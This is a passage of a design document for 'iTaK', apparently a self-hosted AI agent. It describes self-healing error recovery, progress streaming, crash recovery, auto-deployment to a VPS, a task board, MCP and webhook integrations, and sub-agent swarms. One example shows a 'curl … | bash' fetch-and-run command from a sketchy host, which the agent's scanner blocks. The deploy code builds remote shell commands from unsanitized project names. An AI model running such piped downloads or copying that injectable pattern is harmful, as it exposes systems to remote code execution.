- **Stacks with prompting**: Steering + SOUL.md together = maximum consistency

### Resources
- [Neuronpedia](https://neuronpedia.org/) - browse pre-computed steering features
- Contrastive activation or Sparse Autoencoders to find vectors
- Best at middle layers (abstract reasoning), not early/late layers

---

## §15 - Self-Healing Engine - Auto-Recovery & Auto-Patching

> **When iTaK encounters an error, it doesn't just report it - it fixes itself.**

### The Self-Healing Loop

```
Error Detected (exception, failed tool, timeout, bad response)
     │
     ▼
┌──────────────────────────────────────────────────────────┐
│  STEP 1: CLASSIFY ERROR                                  │
│  Is it repairable or critical?                           │
│  - Repairable: API timeout, missing dependency, bad JSON │
│  - Critical: security breach, data corruption, OOM       │
│  Critical → STOP + alert user immediately                │
└──────────┬───────────────────────────────────────────────┘
           │ (repairable)
     ▼
┌──────────────────────────────────────────────────────────┐
│  STEP 2: CHECK INTERNAL MEMORY                           │
│  "Have I seen this error before?"                        │
│                                                          │
│  2a. Neo4j:  MATCH (e:Error {type: $error_type})         │
│              -[:FIXED_BY]->(s:Solution) RETURN s         │
│  2b. SQLite: keyword search for error message            │
│  2c. Weaviate: semantic search for similar errors        │
│  2d. MEMORY.md: grep for known issues section            │
│                                                          │
│  FOUND → Apply known fix → Test → If works, continue    │
│  NOT FOUND → Continue to Step 3                          │
└──────────┬───────────────────────────────────────────────┘
           │
     ▼
┌──────────────────────────────────────────────────────────┐
│  STEP 3: REASON ABOUT THE ERROR                          │
│  Send error context to chat model:                       │
│  "Here is the error: [traceback]                         │
│   Here is what I was trying to do: [context]             │
│   Suggest 3 possible fixes, ranked by likelihood."       │
│                                                          │
│  Try fixes in order → Test each → First that works, use  │
│  If none work → Continue to Step 4                       │
└──────────┬───────────────────────────────────────────────┘
           │
     ▼
┌──────────────────────────────────────────────────────────┐
│  STEP 4: RESEARCH ONLINE                                 │
│  Search SearXNG + browser scrape for:                    │
│  "[error message] [technology] fix"                      │
│                                                          │
│  Summarize findings → Apply fix → Test                   │
│  Any fix from internet → security scan before applying   │
│  If works → Continue to Step 5                           │
│  If doesn't work after 3 attempts → ESCALATE to user     │
└──────────┬───────────────────────────────────────────────┘
           │
     ▼
┌──────────────────────────────────────────────────────────┐
│  STEP 5: LEARN FROM THE FIX                              │
│  Store the solution in ALL memory layers:                │
│                                                          │
│  Neo4j:    (Error:"ImportError: pptx")-[:FIXED_BY]->     │
│            (Solution:"pip install python-pptx")          │
│            -[:DISCOVERED_ON]->(Date:"2026-02-12")        │
│                                                          │
│  MEMORY.md: Append to "## Known Issues & Fixes" section  │
│  SQLite:   Index for keyword search                      │
│  Weaviate: Embed for semantic search                     │
│                                                          │
│  Next time this error happens → Step 2 finds it instantly │
└──────────────────────────────────────────────────────────┘
```

### Error Classification

| Category | Examples | Self-Heal? | Action |
|----------|----------|-----------|--------|
| **Dependency** | `ModuleNotFoundError`, missing package | ✅ Yes | Install package, retry |
| **Network** | API timeout, connection refused, 429 rate limit | ✅ Yes | Retry with backoff, switch endpoint |
| **Config** | Wrong port, bad API key format, missing env var | ✅ Yes | Check config, suggest fix |
| **Runtime** | `TypeError`, `KeyError`, bad JSON from LLM | ✅ Yes | Parse error, adjust code/prompt |
| **Tool** | Tool execution failed, unexpected output | ✅ Yes | Retry, try alternative tool |
| **Resource** | Disk full, OOM, GPU busy | ⚠️ Partial | Free resources, alert user |
| **Security** | Unauthorized access, credential leak detected | 🚫 No | STOP immediately, alert user |
| **Data** | Corruption, inconsistent state | 🚫 No | STOP, alert user, suggest restore |

### Retry Budget

```python
SELF_HEAL_CONFIG = {
    "max_retries_per_error": 3,        # Don't loop forever
    "max_retries_per_session": 10,     # Total budget per conversation
    "escalate_after_failures": 3,      # Tell user after 3 failed attempts
    "backoff_seconds": [1, 5, 15],     # Exponential backoff
    "internet_fix_security_scan": True, # ALWAYS scan fixes from the web
    "log_all_errors": True,            # Every error → Neo4j for learning
}
```

### Real-World Examples

**Example 1: Missing Python Package**
```
iTaK tries to generate slides → ImportError: No module named 'pptx'
  Step 1: Repairable (dependency error)
  Step 2: Checks Neo4j → No prior fix found
  Step 3: LLM reasons → "Install python-pptx via pip"
  → Runs: pip install python-pptx (in Docker sandbox)
  → Retries original task → Works!
  Step 5: Stores fix in Neo4j:
    (Error:"ImportError pptx")-[:FIXED_BY]->(Solution:"pip install python-pptx")
  Next time → Step 2 finds it instantly
```

**Example 2: Neo4j Connection Lost**
```
iTaK tries to query graph → ConnectionRefusedError on port 7687
  Step 1: Repairable (network error)
  Step 2: Checks MEMORY.md → Finds: "Neo4j on VPS sometimes needs Docker restart"
  → Runs: ssh vps 'docker restart neo4j' (via code_execution tool)
  → Waits 10s → Retries → Works!
  Step 5: Updates Neo4j fix log with timestamp
```

**Example 3: Suspicious Fix from Web**
```
iTaK finds a StackOverflow answer suggesting:
  curl https://sketchy-site.com/fix.sh | bash
  Step 4: Downloads fix → SECURITY SCANNER catches:
    🚫 BLOCKED: "exec of downloaded code from unknown domain"
  → Skips this fix → Tries next search result
  → Finds legitimate pip install solution → ✅ PASS → applies
```

### Extension Hook Integration

Self-healing plugs into the existing extension system:

```
extensions/
├── tool_execute_after/
│   └── self_heal.py       # Catches tool failures, triggers healing loop
├── error_format/
│   └── error_classifier.py # Classifies errors as repairable vs critical
└── process_chain_end/
    └── error_log.py        # Logs all errors to Neo4j after chain completes
```

---

## 16  Live Progress Updates  No More Silence

> **The #1 complaint about AI agents: you ask it to do something and it goes completely silent for 10 minutes. iTaK tells you what it's doing, every step of the way.**

### The Anti-Silence Protocol

When iTaK receives a task, it **immediately responds** with its plan, then streams updates as it works:

```
USER: "Build me a landing page for my SaaS product"

iTaK (instant - within 2 seconds):
  "🎯 Got it! Here's my plan:
   1. Research your product from context/memory
   2. Design the page structure (hero, features, pricing, CTA)
   3. Write the HTML/CSS/JS
   4. Run through code quality gate (lint + security)
   5. Visual test on 3 viewports
   6. Deploy to Dokploy and give you a live link

   Starting now - I'll update you at each step."

iTaK (30 seconds later):
  "✅ Step 1 done - found your product info in memory.
   🔄 Step 2: Designing page layout..."

iTaK (2 minutes later):
  "✅ Step 2 done - hero section + 3 feature cards + pricing table.
   🔄 Step 3: Writing the code..."

iTaK (5 minutes later):
  "✅ Step 3 done - 340 lines of HTML/CSS.
   🔄 Step 4: Running linters..."

iTaK (5.5 minutes later):
  "✅ Step 4 done - 0 lint errors, security scan passed.
   🔄 Step 5: Taking screenshots on desktop/tablet/mobile..."

iTaK (6 minutes later):
  "✅ Step 5 done - screenshots attached.
   🔄 Step 6: Deploying to Dokploy..."

iTaK (7 minutes later):
  "🎉 Done! Here's your landing page:
   🔗 https://landing.yourdomain.com
   📱 Screenshots: [desktop] [tablet] [mobile]
   📝 Source: saved in projects/saas-landing/"
```

### How It Works (Stolen from Agent Zero's Progress System)

Agent Zero already has `set_progress()` and `update_progress()` on every tool. iTaK extends this:

```python
# Every tool call streams progress to the active adapter:

class ProgressTracker:
    """Tracks and streams task progress to the user."""

    def __init__(self, agent, task_description: str):
        self.agent = agent
        self.steps: list[dict] = []
        self.current_step: int = 0

    async def plan(self, steps: list[str]):
        """Announce the plan immediately."""
        self.steps = [{"name": s, "status": "pending"} for s in steps]
        await self.agent.adapter.send(self.format_plan())

    async def start_step(self, step_index: int, detail: str = ""):
        """Mark a step as in-progress and notify user."""
        self.steps[step_index]["status"] = "in_progress"
        await self.agent.adapter.send(f"🔄 Step {step_index + 1}: {detail}")

    async def complete_step(self, step_index: int, summary: str = ""):
        """Mark a step as done and notify user."""
        self.steps[step_index]["status"] = "done"
        await self.agent.adapter.send(f"✅ Step {step_index + 1} done - {summary}")

    async def fail_step(self, step_index: int, error: str):
        """Mark a step as failed - triggers self-healing."""
        self.steps[step_index]["status"] = "failed"
        await self.agent.adapter.send(f"⚠️ Step {step_index + 1} hit an issue - self-healing...")
```

### Temp Memory - Working Context

For multi-step tasks, iTaK uses a **working context** (temp memory that lives only during the task):

```python
# Working context - cleared after task completes
working_context = {
    "task": "Build landing page",
    "plan": ["research", "design", "code", "lint", "test", "deploy"],
    "current_step": 3,
    "artifacts_created": ["index.html", "styles.css"],
    "decisions_made": ["Used gradient hero", "3 pricing tiers"],
    "errors_encountered": [],
    "time_started": "2026-02-12T13:30:00",
}

# This is NOT saved to long-term memory
# It exists only so iTaK doesn't lose track mid-task
# If the LLM context window fills up, this is the LAST thing to be compressed
```

### Adapter-Specific Formatting

Progress looks different on each platform:

| Adapter | Format | Why |
|---------|--------|-----|
| **Dashboard** | Real-time progress bar + step list in sidebar | Full UI control |
| **Discord** | Edit the same message (avoid spam) | Discord rate limits, thread clutter |
| **Telegram** | Edit the same message | Same as Discord |
| **Slack** | Update message in thread | Slack threading model |
| **CLI** | Live terminal output with spinners | Terminal UX |

```python
# Discord-specific: edit one message instead of sending 20
class DiscordProgressAdapter:
    async def send_progress(self, tracker: ProgressTracker):
        if not self.progress_message:
            self.progress_message = await self.channel.send(tracker.format_plan())
        else:
            await self.progress_message.edit(content=tracker.format_current())
```

---

## §17 - Crash Resilience - Never Die Silently

> **OpenClaw's server drops on bad errors. iTaK doesn't. If something crashes, it restarts, tells you what happened, and picks up where it left off.**

### The Problem with OpenClaw

When OpenClaw hits a bad error (uncaught exception, OOM, corrupted state), the server just... dies. No message to the user, no restart, nothing. You have to SSH in, check logs, and manually restart.

### iTaK's Defense Layers

```
Layer 1: EXCEPTION CATCHING - Every tool call wrapped in try/except
Layer 2: PROCESS SUPERVISOR - systemd/Docker restart policy (always)
Layer 3: WATCHDOG - Heartbeat checks own health every 30 seconds
Layer 4: STATE PERSISTENCE - Working context saved to disk on every step
Layer 5: CRASH NOTIFICATION - If iTaK restarts, it tells you immediately
```

#### Exception Isolation

```python
# Every tool runs in a sandbox - one bad tool can't crash the agent:
async def execute_tool_safe(self, tool_name: str, args: dict):
    try:
        result = await self.tools[tool_name].execute(**args)
        return result
    except Exception as e:
        # Log the error
        self.log.error(f"Tool {tool_name} crashed: {e}")
        # Classify: is this self-healable?
        if self.error_classifier.is_repairable(e):
            return await self.self_heal(tool_name, args, e)
        else:
            # Tell the user, but DON'T crash the agent
            await self.adapter.send(f"⚠️ Tool `{tool_name}` failed: {e}\nI'm still running - trying an alternative approach.")
            return {"error": str(e), "recovered": True}
```

#### Process Supervision

```yaml
# Docker Compose - auto-restart on crash:
services:
  iTaK:
    image: iTaK:latest
    restart: unless-stopped    # Always restart on crash
    healthcheck:
      test: ["CMD", "python", "-c", "import requests; requests.get('http://localhost:PORT/health')"]
      interval: 30s
      timeout: 10s
      retries: 3
      start_period: 10s

# Or systemd for bare-metal:
# [Service]
# Restart=always
# RestartSec=5
# WatchdogSec=60
```

#### Crash Recovery Message

```
# If iTaK crashes and restarts, the user sees this:
"⚠️ iTaK restarted at 13:45:02 (was down for 5 seconds)
 Reason: Out of memory during image processing
 Recovery: Cleared temp files, freed 2GB RAM
 Your last task 'Build landing page' was at Step 4/6 - resuming now..."
```

#### State Checkpointing

```python
# Every step saves state to disk - if iTaK crashes mid-task, it resumes:
CHECKPOINT_FILE = "data/checkpoint.json"

async def checkpoint(self):
    """Save current working context to disk."""
    state = {
        "task": self.current_task,
        "step": self.current_step,
        "artifacts": self.artifacts_created,
        "timestamp": datetime.now().isoformat(),
    }
    with open(CHECKPOINT_FILE, "w") as f:
        json.dump(state, f)

async def resume_from_checkpoint(self):
    """On restart, check for incomplete tasks."""
    if os.path.exists(CHECKPOINT_FILE):
        with open(CHECKPOINT_FILE) as f:
            state = json.load(f)
        await self.adapter.send(
            f"⚠️ iTaK restarted. Resuming task '{state['task']}' "
            f"from step {state['step']}..."
        )
        return state
    return None
```

---

## 18  Auto-Hosting  Deploy What You Build

> **When iTaK builds a website, it doesn't just dump files in a folder. It deploys it and gives you a clickable link.**

> [!NOTE]
> **From Agent Zero Transcripts (§0 Lesson #11):** A0 uses Docker + Tailscale VPN for VPS deployment - bind container ports to Tailscale IP only (blocks public access), UFW firewall with explicit port allowlists, Docker Compose with persistence volume mapping. Consider adopting Tailscale VPN binding as an alternative to FRP for secure remote access.

### The Problem

You ask iTaK to build a website. It writes the code. Then... you have to manually set up a server, copy files, configure DNS, etc. That defeats the whole purpose of an AI agent.

### iTaK's Auto-Deploy Pipeline

```
USER: "Build me a portfolio site"

iTaK:
  1. Writes the code → projects/portfolio/
  2. Tests it locally (visual test)
  3. Deploys to your VPS automatically
  4. Gives you a live URL: https://portfolio.yourdomain.com
```

### Deployment Options (configured in config.json)

```python
DEPLOY_CONFIG = {
    # Option 1: Dokploy (if running on your VPS)
    "method": "dokploy",  # or "docker", "static", "caddy"
    "dokploy_url": "https://dokploy.yourdomain.com",
    "dokploy_api_key": "...",

    # Option 2: Simple static file server (Caddy)
    # "method": "caddy",
    # Auto-generates Caddyfile for each project

    # Option 3: Docker container
    # "method": "docker",
    # Builds a container and runs it on the VPS

    # Option 4: Just serve from a projects directory
    # "method": "static",
    # Caddy/Nginx serves ~/projects/{name}/ as a subdomain
}
```

### How Dokploy Integration Works

```python
# iTaK's auto-deploy tool:
async def deploy_project(project_name: str, project_path: str):
    """Deploy a project to the VPS and return a live URL."""

    if config.deploy_method == "dokploy":
        # Use Dokploy API to create/update application
        response = await dokploy_api.create_application(
            name=project_name,
            source_type="raw",  # Upload files directly
            domain=f"{project_name}.{config.base_domain}",
        )
        # Upload project files
        await dokploy_api.upload_files(response.app_id, project_path)
        # Deploy
        await dokploy_api.deploy(response.app_id)
        return f"https://{project_name}.{config.base_domain}"

    elif config.deploy_method == "caddy":
        # SSH to VPS, copy files, add Caddy config
        await ssh_exec(f"mkdir -p /var/www/{project_name}")
        await scp_upload(project_path, f"/var/www/{project_name}/")
        await ssh_exec(f"""
            echo '{project_name}.{config.base_domain} {{
                root * /var/www/{project_name}
                file_server
            }}' >> /etc/caddy/Caddyfile
            systemctl reload caddy
        """)
        return f"https://{project_name}.{config.base_domain}"
```

### Simplest Option: Static File Server on VPS

If Dokploy feels like overkill, the simplest setup is:

```
VPS:
├── Caddy (reverse proxy - already running for iTaK dashboard)
├── /var/www/projects/
│   ├── portfolio/     → portfolio.yourdomain.com
│   ├── landing/       → landing.yourdomain.com
│   └── dashboard/     → dashboard.yourdomain.com

iTaK just SCPs files to /var/www/projects/{name}/ and Caddy serves them.
Caddy auto-provisions HTTPS via Let's Encrypt. Zero config per project.
```

### User Flow

```
USER: "Make me a portfolio site with my GitHub projects"

iTaK: "🎯 Plan:
  1. Fetch your GitHub repos via API
  2. Build a responsive portfolio page
  3. Lint + visual test
  4. Deploy to portfolio.yourdomain.com
  Starting now..."

[...7 minutes later...]

iTaK: "🎉 Done!
  🔗 Live: https://portfolio.yourdomain.com
  📱 Screenshots: [desktop] [tablet] [mobile]
  📝 Source: projects/portfolio/
  ⚙️ To update: just tell me what to change and I'll redeploy"
```

---

## §19 - Mission Control - Built-in Task Board

> **iTaK has a built-in Kanban task board so you always know what's been done, what's in progress, and what's coming next. No external tools needed.**

Inspired by: **[mission-control](https://github.com/David2024patton/mission-control)** - the task orchestration dashboard

### Why This Matters

OpenClaw doesn't track tasks at all. You tell it to do 5 things, and you have no idea which ones are done, which failed, and which it forgot about. iTaK tracks everything.

### Task Board (in Dashboard)

```
┌──────────────────────────────────────────────────────────────────────────┐
│  iTaK Mission Control                                        [+ New]  │
├────────────────┬────────────────┬────────────────┬───────────────────────┤
│    📥 INBOX    │  🔄 IN PROGRESS│   👀 REVIEW    │      ✅ DONE          │
├────────────────┼────────────────┼────────────────┼───────────────────────┤
│                │                │                │                       │
│  ┌──────────┐  │  ┌──────────┐  │  ┌──────────┐  │  ┌──────────┐        │
│  │ Fix the  │  │  │ Build    │  │  │ Landing  │  │  │ Discord  │        │
│  │ login    │  │  │ portfolio│  │  │ page v2  │  │  │ bot      │        │
│  │ bug      │  │  │ site     │  │  │          │  │  │ setup    │        │
│  │          │  │  │ ████░░ 4/6│  │  │ Needs    │  │  │ ✓ 6/6   │        │
│  │ Priority:│  │  │ Step 4:  │  │  │ your     │  │  │ Completed│        │
│  │ 🔴 HIGH  │  │  │ Linting  │  │  │ feedback │  │  │ Feb 12   │        │
│  └──────────┘  │  └──────────┘  │  └──────────┘  │  └──────────┘        │
│                │                │                │                       │
│  ┌──────────┐  │                │                │  ┌──────────┐        │
│  │ Add dark │  │                │                │  │ Set up   │        │
│  │ mode to  │  │                │                │  │ Neo4j    │        │
│  │ dash     │  │                │                │  │ ✓ 3/3   │        │
│  │ Priority:│  │                │                │  │ Feb 11   │        │
│  │ 🟡 MED   │  │                │                │  └──────────┘        │
│  └──────────┘  │                │                │                       │
└────────────────┴────────────────┴────────────────┴───────────────────────┘
```

### Task Data Model

```python
@dataclass
class Task:
    id: str                          # UUID
    title: str                       # "Build portfolio site"
    description: str                 # Full details
    status: str                      # inbox | in_progress | review | done | failed
    priority: str                    # low | medium | high | critical
    steps: list[TaskStep]            # Breakdown of sub-tasks
    current_step: int                # Which step we're on
    created_at: datetime
    started_at: datetime | None
    completed_at: datetime | None
    deliverables: list[Deliverable]  # URLs, files, screenshots
    source: str                      # "discord" | "telegram" | "dashboard" | "heartbeat"
    error_log: list[str]             # Any errors encountered

@dataclass
class TaskStep:
    name: str                        # "Write HTML/CSS"
    status: str                      # pending | in_progress | done | failed
    started_at: datetime | None
    completed_at: datetime | None
    notes: str                       # "340 lines, passed lint"

@dataclass
class Deliverable:
    type: str                        # "url" | "file" | "screenshot"
    title: str                       # "Live site"
    value: str                       # "https://portfolio.yourdomain.com"
```

### How Tasks Flow

```
1. USER says "Build me X" (on Discord, Telegram, Dashboard, etc.)
       │
2. iTaK creates a Task (status: inbox → in_progress)
       │
3. iTaK breaks it into steps (plan)
       │
4. iTaK works through steps, updating progress
       │
5. Task moves to REVIEW (if visual test / user feedback needed)
       │
6. USER approves → DONE  |  USER requests changes → back to IN PROGRESS
       │
7. Task stored in history - searchable, replayable
```

### Task List via Adapters

Even without the dashboard, you can manage tasks from Discord/Telegram:

```
USER (Discord): "/tasks"
iTaK: "📋 Task Board:
  🔄 IN PROGRESS:
    • Build portfolio site (Step 4/6 - linting)
  👀 REVIEW:
    • Landing page v2 - needs your feedback
  📥 INBOX:
    • Fix login bug (🔴 HIGH)
    • Add dark mode (🟡 MED)
  ✅ DONE (today):
    • Set up Neo4j ✓
    • Discord bot setup ✓"

USER: "/tasks done"
iTaK: Shows completed tasks with timestamps and deliverables

USER: "/tasks cancel 3"
iTaK: Cancels task #3, moves to archive
```

### Task Persistence

Tasks are stored in SQLite (same as other local state) and indexed in Neo4j for graph queries:

```python
# SQLite: fast CRUD for task board
tasks_db.create("Build portfolio", priority="high", source="discord")

# Neo4j: relationship queries
# (Task:"Build Portfolio")-[:CREATED_BY]->(User:"David")
# (Task:"Build Portfolio")-[:PRODUCED]->(Deliverable:"https://portfolio.com")
# (Task:"Build Portfolio")-[:USED_TOOL]->(Tool:"code_execution")
# (Task:"Build Portfolio")-[:ENCOUNTERED]->(Error:"ModuleNotFoundError")
# (Task:"Build Portfolio")-[:TOOK]->(Duration:"7 minutes")
```

### Extension Hook

```
extensions/
├── message_loop_start/
│   └── task_tracker.py    # Creates task on new user request
├── tool_execute_after/
│   └── task_progress.py   # Updates task step on tool completion
└── process_chain_end/
    └── task_complete.py   # Moves task to review/done when chain ends
```

---

## 20  MCP & A2A  Connect to Everything

> **iTaK can both USE external MCP servers (tools, APIs, data) AND expose itself AS an MCP server for other agents/tools to call.**

Stolen from: **Agent Zero** - full MCP client + server + A2A implementation

### What is MCP?

**Model Context Protocol** - a standard that lets AI agents connect to external tools and data sources. Think of it like USB-C for AI: plug in any tool, and it just works.

### iTaK as MCP Client (Connect TO External Servers)

```python
# config.json - add any MCP server:
{
    "mcp_servers": {
        "mcpServers": {
            "filesystem": {
                "command": "npx",
                "args": ["-y", "@modelcontextprotocol/server-filesystem", "/tmp/workspace"]
            },
            "github": {
                "command": "npx",
                "args": ["-y", "@modelcontextprotocol/server-github"],
                "env": { "GITHUB_TOKEN": "{{secrets.github_token}}" }
            },
            "postgres": {
                "command": "npx",
                "args": ["-y", "@modelcontextprotocol/server-postgres", "{{secrets.pg_url}}"]
            },
            "browser": {
                "command": "npx",
                "args": ["-y", "@anthropic/mcp-server-puppeteer"]
            }
        }
    },
    "mcp_client_init_timeout": 10,
    "mcp_client_tool_timeout": 120
}
```

**Any MCP server works** - filesystem, GitHub, Slack, databases, web scraping, etc. Install it, add to config, iTaK auto-discovers the tools.

### iTaK as MCP Server (Other Tools Call iTaK)

```python
# iTaK exposes itself as an MCP server via FastMCP (SSE):
# Other agents, IDEs, or tools can use iTaK as a tool

from fastmcp import FastMCP

mcp_server = FastMCP(
    name="iTaK MCP Server",
    description="Personal AI agent with long-term memory and tool execution"
)

@mcp_server.tool(name="send_message")
async def send_message(message: str, persistent_chat: bool = False) -> str:
    """Send a message to iTaK and get a response."""
    result = await agent.monologue(message)
    return result

# This means:
# - Cursor/VS Code can use iTaK as a coding tool via MCP
# - Other AI agents can delegate tasks to iTaK
# - n8n/Zapier can call iTaK via its SSE endpoint
```

### A2A (Agent-to-Agent Protocol)

iTaK also supports Google's **Agent-to-Agent** protocol - a standard for agents to discover, communicate with, and delegate tasks to each other:

```
iTaK ←→ Agent Zero (via A2A)
iTaK ←→ Custom Trading Bot (via A2A)
iTaK ←→ SEO Agent (via A2A)
```

### Dashboard: MCP/A2A Settings Tab

```
┌─────────────────────────────────────────────┐
│  MCP/A2A Settings                            │
├─────────────────────────────────────────────┤
│                                              │
│  🔌 External MCP Servers                     │
│  ├── MCP Servers Config: [Open JSON Editor]  │
│  ├── Client Init Timeout: [10] seconds       │
│  └── Client Tool Timeout: [120] seconds      │
│                                              │
│  📡 iTaK as MCP Server                     │
│  ├── Enabled: [✓]                            │
│  ├── Token: [auto-generated]                 │
│  └── Endpoint: sse://localhost:PORT/mcp      │
│                                              │
│  🤝 A2A Server                               │
│  ├── Enabled: [✓]                            │
│  └── Agent Card URL: http://localhost:PORT   │
│                                              │
└─────────────────────────────────────────────┘
```

---

## §21 - Workflow Automation - n8n & Zapier Integration

> **iTaK integrates with n8n and Zapier so you can build automations that trigger iTaK or that iTaK triggers.**

### How It Works

iTaK exposes **webhook endpoints** that n8n/Zapier can call, and iTaK can call **n8n/Zapier webhooks** to trigger external automations:

```
┌──────────────────────────────────────────────────────────────┐
│                    INTEGRATION FLOW                           │
│                                                              │
│  INBOUND (n8n/Zapier → iTaK):                              │
│  ┌──────┐    webhook     ┌────────┐                          │
│  │ n8n  │───────────────→│ iTaK │──→ executes task         │
│  │Zapier│    POST /api   │        │──→ stores in task board  │
│  └──────┘    /webhook    └────────┘──→ replies via adapter   │
│                                                              │
│  OUTBOUND (iTaK → n8n/Zapier):                             │
│  ┌────────┐   webhook    ┌──────┐                            │
│  │ iTaK │─────────────→│ n8n  │──→ send email/SMS          │
│  │        │   POST URL   │Zapier│──→ update spreadsheet      │
│  └────────┘              └──────┘──→ post to social media    │
│                                                              │
│  MCP (bidirectional):                                        │
│  iTaK ←──── MCP SSE ────→ n8n (via MCP node)              │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

### Inbound Webhooks (n8n/Zapier calls iTaK)

```python
# iTaK's FastAPI exposes webhook endpoints:

@app.post("/api/webhook")
async def webhook_handler(request: WebhookRequest):
    """Receive tasks from external automation tools."""
    task = task_board.create(
        title=request.title or "Webhook task",
        description=request.message,
        source=request.source or "webhook",
        priority=request.priority or "medium",
    )
    result = await agent.process_task(task)
    return {"task_id": task.id, "status": "completed", "result": result}

# n8n example:
# HTTP Request Node → POST https://iTaK.yourdomain.com/api/webhook
# Body: { "message": "Analyze this CSV and generate a report", "priority": "high" }
# Auth: Bearer {{API_TOKEN}}

# Zapier example:
# Trigger: New email matching filter
# Action: Webhooks by Zapier → POST to iTaK webhook
# iTaK processes → replies via Discord
```

### Outbound Webhooks (iTaK calls n8n/Zapier)

```python
# iTaK can trigger external automations:

INTEGRATIONS = {
    "n8n": {
        "webhook_url": "https://n8n.yourdomain.com/webhook/iTaK-trigger",
        "events": ["task_completed", "error_critical", "daily_report"]
    },
    "zapier": {
        "webhook_url": "https://hooks.zapier.com/hooks/catch/12345/abcdef/",
        "events": ["task_completed"]
    }
}

# When iTaK finishes a task:
async def on_task_complete(task: Task):
    for name, config in INTEGRATIONS.items():
        if "task_completed" in config["events"]:
            await http_post(config["webhook_url"], {
                "event": "task_completed",
                "task_id": task.id,
                "title": task.title,
                "result": task.deliverables,
                "timestamp": datetime.now().isoformat()
            })
```

### Recommended n8n Workflows

| Workflow | Trigger | iTaK Action | Output |
|----------|---------|---------------|--------|
| **Daily briefing** | Cron (8am) | Summarize overnight activity | Send to Discord/email |
| **Email → Task** | New email | Parse and create task | Reply with result |
| **GitHub PR** | New PR webhook | Review code, run lint | Comment on PR |
| **Stock alert** | Price trigger | Analyze market | Discord notification |
| **Content pipeline** | RSS/social trigger | Summarize + tag | Store in memory |

### Config in Dashboard

```json
{
    "integrations": {
        "n8n_webhook_url": "https://n8n.yourdomain.com/webhook/iTaK",
        "zapier_webhook_url": "https://hooks.zapier.com/hooks/catch/...",
        "enabled_events": ["task_completed", "error_critical", "daily_report"],
        "inbound_webhook_secret": "{{secrets.webhook_secret}}"
    }
}
```

---

## §22  Agent Swarms & Custom Agents

> **iTaK can spawn specialized sub-agents, coordinate agent swarms, and let you define custom agent personalities - not just one generic chatbot.**

Stolen from: **Agent Zero** (call_subordinate.py, profiles/) + **mission-control** (multi-agent orchestration)

### Custom Agent Profiles

Each sub-agent can have a specialized personality and skill set via **profiles**:

```
prompts/profiles/
├── researcher.md       # Deep web research, source verification
├── coder.md            # Code writing, debugging, testing
├── trader.md           # Polymarket analysis, trading strategies
├── debugger.md         # Error diagnosis, log analysis
├── writer.md           # Content creation, documentation
├── devops.md           # Infrastructure, deployment, Docker
├── security.md         # Security audit, vulnerability scanning
└── custom/             # User-defined profiles
    ├── seo_analyst.md
    └── data_engineer.md
```

### How Sub-Agents Work

```python
# iTaK spawns specialized sub-agents for complex tasks:

# In the main agent's monologue:
result = await call_subordinate(
    message="Research the top 10 competitors for AI chatbot SaaS",
    profile="researcher"     # Uses prompts/profiles/researcher.md
)

# The subordinate:
# 1. Gets the researcher personality/instructions
# 2. Has access to all tools (browser, search, code execution)
# 3. Runs its own monologue loop
# 4. Returns results to the parent agent
# 5. Parent agent continues with the results
```

### Agent Swarm Coordination

For large tasks, iTaK can coordinate **multiple sub-agents** working in parallel:

```
USER: "Build a complete SaaS landing page with SEO optimization"

iTaK (coordinator):
├── Spawns: researcher (profile: seo_analyst)
│   └── "Research top 10 competitor landing pages, extract keywords"
├── Spawns: coder (profile: coder)
│   └── "Build responsive HTML/CSS/JS landing page"
├── Spawns: writer (profile: writer)
│   └── "Write compelling copy for hero, features, CTA"
│
│   [All 3 work simultaneously]
│
├── Collects results from all 3
├── Merges: code + copy + SEO keywords
├── Runs code quality gate
├── Visual test
└── Deploys → gives you the link

Total time: ~5 minutes instead of ~15 minutes sequentially
```

### Agent Swarm Data Model

```python
@dataclass
class AgentProfile:
    name: str                    # "researcher"
    display_name: str            # "Research Specialist"
    system_prompt_file: str      # "prompts/profiles/researcher.md"
    preferred_model: str | None  # Override model (e.g., use cheaper model for simple tasks)
    tools_allowed: list[str]     # Restrict tool access per agent
    max_iterations: int          # Limit monologue loops (prevent runaway)

@dataclass
class SwarmTask:
    coordinator: Agent           # Parent agent
    subtasks: list[dict]         # [{profile, message, status, result}]
    strategy: str                # "parallel" | "sequential" | "pipeline"
    merge_strategy: str          # "concat" | "summarize" | "custom"
```

### Creating Custom Agents (Dashboard)

```
┌──────────────────────────────────────────────────────────┐
│  Agent Profiles                                    [+ New]│
├──────────────────────────────────────────────────────────┤
│                                                          │
│  🔬 Researcher       [Edit] [Clone] [Delete]            │
│  └── Deep web research, source verification              │
│                                                          │
│  💻 Coder            [Edit] [Clone] [Delete]            │
│  └── Code writing, debugging, testing                    │
│                                                          │
│  📈 Trader           [Edit] [Clone] [Delete]            │
│  └── Polymarket analysis, trading strategies             │
│                                                          │
│  ✏️ Writer            [Edit] [Clone] [Delete]            │
│  └── Content creation, documentation                     │
│                                                          │
│  🔧 Custom: SEO Bot  [Edit] [Clone] [Delete]            │
│  └── SEO analysis, keyword research, competitor audit    │
│                                                          │
│  [+ Create New Profile]                                  │
│  Profile Name: [________________]                        │
│  System Prompt: [Open Editor]                            │
│  Preferred Model: [Dropdown: auto/chat/utility]          │
│  Max Iterations: [25]                                    │
│  Tools Allowed: [☑ All] or [select specific]            │
│                                                          │
└──────────────────────────────────────────────────────────┘
```

### Agent-to-Agent Messaging

Sub-agents can communicate with each other (not just up to the coordinator):

```python
# agents.md (loaded into each agent's context):
"""
## Known Agents
- **Researcher**: Expert at finding and verifying information
- **Coder**: Expert at writing, debugging, and testing code
- **Writer**: Expert at compelling copy and documentation

## Communication Protocol
To delegate to another agent: use call_subordinate(message, profile="agent_name")
To share context: include relevant findings in your response
"""
```

---

## §23 - MemGPT-Inspired Memory - Self-Managing Memory Tiers

> **Stolen from [MemGPT](https://github.com/David2024patton/MemGPT): The memory doesn't just store things - it actively manages itself, deciding what to keep in fast memory, what to archive, and what to search for on demand.**

### MemGPT's Key Innovation

Traditional agents have a fixed context window. MemGPT treats memory like an **operating system treats RAM + disk**: the agent actively pages information in and out of its context window.

```
┌───────────────────────────────────────────────────────────────┐
│                   iTaK MEMORY TIERS                          │
│                                                               │
│  ┌─────────────────────────────────────────────────────────┐ │
│  │  TIER 1: CORE CONTEXT (always in LLM context)           │ │
│  │  ├── SOUL.md - personality, rules, identity              │ │
│  │  ├── USER.md - user preferences, communication style    │ │
│  │  ├── AGENTS.md - known agents, delegation rules         │ │
│  │  ├── Working context - current task state                │ │
